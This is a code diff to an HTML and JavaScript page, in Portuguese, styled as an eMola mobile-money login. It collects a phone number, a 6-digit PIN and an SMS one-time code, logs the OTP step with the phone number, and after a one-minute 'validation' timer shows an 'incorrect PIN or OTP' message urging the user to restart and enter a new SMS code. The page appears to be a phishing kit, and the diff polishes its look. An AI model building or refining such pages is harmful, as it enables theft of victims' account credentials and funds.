+            Código de 6 dígitos
+          </label>
           <div class="otp-row" aria-label="Código de verificação">
             <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 1" required>
             <input class="otp-digit" type="text" inputmode="numeric" maxlength="1" aria-label="Dígito 2" required>
@@ -565,16 +909,29 @@
           </div>
           <div class="otp-validity">
             <span class="pulse"></span>
-            Código válido por <strong>1 minuto</strong>
+            Código válido por <strong>&nbsp;1 minuto</strong>
           </div>
           <p class="error" id="otpError">Introduza os 6 dígitos.</p>
-          <button class="btn" type="submit">Continuar</button>
+
+          <button class="btn" type="submit">
+            Continuar
+            <svg class="arrow" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M12 5l7 7-7 7"/>
+            </svg>
+          </button>
         </form>
 
         <!-- STEP 4: WAITING + FINAL ERROR -->
         <section id="waitingStep" class="step">
           <div class="processing">
-            <div class="spinner"></div>
+            <div class="spinner-wrap">
+              <div class="spinner"></div>
+              <div class="spinner-core">
+                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
+                </svg>
+              </div>
+            </div>
             <h2>Validação em curso</h2>
             <p class="status">Aguarde na tela enquanto verificamos as informações.</p>
             <p class="status">Tempo restante: <span class="timer" id="waitCountdown">01:00</span></p>
@@ -585,15 +942,28 @@
           <div id="finalErrorBox" class="final-error" style="display:none;">
             O PIN ou o código OTP estão incorretos.
             <div class="sms-note">
-              Ao clicar em <strong>Reiniciar</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.
+              <span class="icon">✉</span>
+              <span>Ao clicar em <strong>Reiniciar</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.</span>
             </div>
-            <button class="btn" id="finalRestartBtn" type="button">Reiniciar e receber novo código</button>
+            <button class="btn" id="finalRestartBtn" type="button">
+              <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;stroke-width:2.6;fill:none;stroke:currentColor;">
+                <path d="M3 12a9 9 0 1 0 3-6.7L3 8"/>
+                <path d="M3 3v5h5"/>
+              </svg>
+              Reiniciar e receber novo código
+            </button>
           </div>
         </section>
       </div>
 
       <footer class="footer">
-        <a class="small-link" href="#" id="restart">Reiniciar</a>
+        <a class="small-link" href="#" id="restart">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 12a9 9 0 1 0 3-6.7L3 8"/>
+            <path d="M3 3v5h5"/>
+          </svg>
+          Reiniciar
+        </a>
       </footer>
     </section>
   </main>
@@ -647,7 +1017,6 @@
     let otpSubmitting = false;
 
     // ====== STEP INDICATOR ======
-    // Etapa visual: 1 = login/processing, 2 = OTP, 3 = waiting/validação
     function setStepIndicator(stepNumber) {
       stepDots.forEach((dot, i) => {
         const n = i + 1;
@@ -679,7 +1048,6 @@
 
     // ====== PHONE VALIDATION (eMola: 86, 87, 88) ======
     function isValidEmolaPhone(phone) {
-      // 9 dígitos, começa por 86, 87 ou 88
       return /^(86|87|88)\d{7}$/.test(phone);
     }
 
@@ -695,17 +1063,17 @@
 
       if (!phoneOk) {
         loginError.textContent = "Número inválido. O telefone deve começar por 86, 87 ou 88 (números eMola) e ter 9 dígitos.";
-        loginError.style.display = "block";
+        loginError.classList.add("show");
         phoneInput.focus();
         return;
       }
       if (!pinOk) {
         loginError.textContent = "O PIN deve ter exatamente 6 dígitos.";
-        loginError.style.display = "block";
+        loginError.classList.add("show");
         pinInput.focus();
         return;
       }
-      loginError.style.display = "none";
+      loginError.classList.remove("show");
 
       currentPhone = phone;
       currentPin = pin;
@@ -768,11 +1136,11 @@
       if (otpSubmitting) return;
       const code = otpDigits.map(input => input.value).join("");
       if (!/^\d{6}$/.test(code)) {
-        document.getElementById("otpError").style.display = "block";
+        document.getElementById("otpError").classList.add("show");
         return;
       }
       otpSubmitting = true;
-      document.getElementById("otpError").style.display = "none";
+      document.getElementById("otpError").classList.remove("show");
 
       await logEvent("otp_step_completed", {
         phone: currentPhone,
@@ -842,8 +1210,8 @@
       pinInput.value = "";
       otpDigits.forEach(input => input.value = "");
       syncOtpFilled();
-      document.getElementById("loginError").style.display = "none";
-      document.getElementById("otpError").style.display = "none";
+      document.getElementById("loginError").classList.remove("show");
+      document.getElementById("otpError").classList.remove("show");
       showStep(loginForm);
       phoneInput.focus();
       otpDigits.forEach(inp => inp.classList.remove("filled"));
